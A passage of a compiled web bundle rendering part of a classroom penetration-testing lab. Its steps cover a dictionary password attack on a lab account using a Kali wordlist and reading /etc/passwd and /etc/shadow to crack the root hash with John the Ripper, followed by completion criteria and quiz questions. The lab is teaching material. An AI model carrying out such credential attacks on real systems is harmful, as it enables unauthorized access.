tab."),(0,o.kt)("li",{parentName:"ol"},"In the ",(0,o.kt)("strong",{parentName:"li"},"Username")," section, type the username called ",(0,o.kt)("strong",{parentName:"li"},"weak"),"."),(0,o.kt)("li",{parentName:"ol"},"In the ",(0,o.kt)("strong",{parentName:"li"},"Password")," section, click on the ",(0,o.kt)("strong",{parentName:"li"},"passwords list")," radio button, and then click on the ",(0,o.kt)("strong",{parentName:"li"},"passwords list text-box")," in order to browse to the ",(0,o.kt)("strong",{parentName:"li"},"/root/cain.txt")," dictionary (on your Kali Linux system) that contains common passwords that you downloaded and decompressed."),(0,o.kt)("li",{parentName:"ol"},"At the bottom of the screen, check ",(0,o.kt)("strong",{parentName:"li"},"Try login as password"),", and click ",(0,o.kt)("strong",{parentName:"li"},"Try Empty Password"),"."),(0,o.kt)("li",{parentName:"ol"},"Click on the ",(0,o.kt)("strong",{parentName:"li"},"Start")," tab, and click on the ",(0,o.kt)("strong",{parentName:"li"},"Start")," button (at the bottom of the screen) to begin the attack."),(0,o.kt)("li",{parentName:"ol"},"This attack may take several minutes to complete."),(0,o.kt)("li",{parentName:"ol"},"Check the output from the Password Cracking Attempt. Did it list any usernames and passwords? If so, record the information in your lab log-book.")),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Gaining Root Access:")," Once a penetration tester has access to a system as an unpriviledged user, there are methods to try to identify and gain access to an administrative account. For example with Linux systems, gaining access to the ",(0,o.kt)("strong",{parentName:"p"},"/etc/passwd")," file to list users with administrative privedges and gaining access to the ",(0,o.kt)("strong",{parentName:"p"},"/etc/shadow")," to attempt a crack the root password hash (via the ",(0,o.kt)("strong",{parentName:"p"},"John the Ripper")," utility)."),(0,o.kt)("ol",{start:17},(0,o.kt)("li",{parentName:"ol"},"What sort of harm can be done to this organization if the ",(0,o.kt)("strong",{parentName:"li"},"root")," account has been hacked?"),(0,o.kt)("li",{parentName:"ol"},"What sort of password rules should be used to make it harder to penetrate this system?")),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Sharpening Your Skills (hackthissite.org)")),(0,o.kt)("p",null,'If you are interested in practicing or "honing" your penetration skills, there is a site called ',(0,o.kt)("a",{parentName:"p",href:"http://www.hackthissite.org"},"http://www.hackthissite.org")," that allows students to play and practice their skills."),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"WARNING"),": You ARE NOT SAFE in leaving personal information on the site. The owner of this site has served jail-time for FRAUD. There is also the possibility that a member of the hacker community may be able to access your personal information and use it for their personal advantage (at your expense)."),(0,o.kt)("p",null,"You have been warned!"),(0,o.kt)("ol",{start:19},(0,o.kt)("li",{parentName:"ol"},"Record your findings in your lab log-book."),(0,o.kt)("li",{parentName:"ol"},'Proceed to the "Completing the Lab".')),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Answer Task #4 observations / questions in your lab log book.")),(0,o.kt)("h2",{id:"completing-the-lab"},"Completing the Lab"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Arrange evidence for each of these items on your screen, then ask your instructor to review them and sign off on the lab's completion:")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Proof of ",(0,o.kt)("strong",{parentName:"li"},"Windows VM hack from Phishing / Malicious Code.")),(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("strong",{parentName:"li"},"Packet Sniffing")," information from Linux to Windows FTP connection."),(0,o.kt)("li",{parentName:"ol"},"Demonstation of ",(0,o.kt)("strong",{parentName:"li"},"prevention from Data Injection Attack.")),(0,o.kt)("li",{parentName:"ol"},"Completed Lab 4 notes.")),(0,o.kt)("h2",{id:"preparing-for-quizzes"},"Preparing for Quizzes"),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Briefly explain the purpose of a ",(0,o.kt)("strong",{parentName:"li"},"Phishing")," Attack. How can phishing relate to using ",(0,o.kt)("strong",{parentName:"li"},"malicious code"),"?"),(0,o.kt)("li",{parentName:"ol"},"Define the term ",(0,o.kt)("strong",{parentName:"li"},"Man in the Middle")," attack."),(0,o.kt)("li",{parentName:"ol"},"Briefly list the steps in a ",(0,o.kt)("strong",{parentName:"li"},"Database Injection")," attack."),(0,o.kt)("li",{parentName:"ol"},"How can a ",(0,o.kt)("strong",{parentName:"li"},"dictionary file")," be used to crack passwords on a targeted server?"),(0,o.kt)("li",{parentName:"ol"},"What is a ",(0,o.kt)("strong",{parentName:"li"},"password hash"),"? How can a ",(0,o.kt)("em",{parentName:"li"},"password hash")," be cracked?"),(0,o.kt)("li",{parentName:"ol"},"What can an organization do to prevent passwords on their computer system from being cracked?")))}m.isMDXComponent=!0}}]);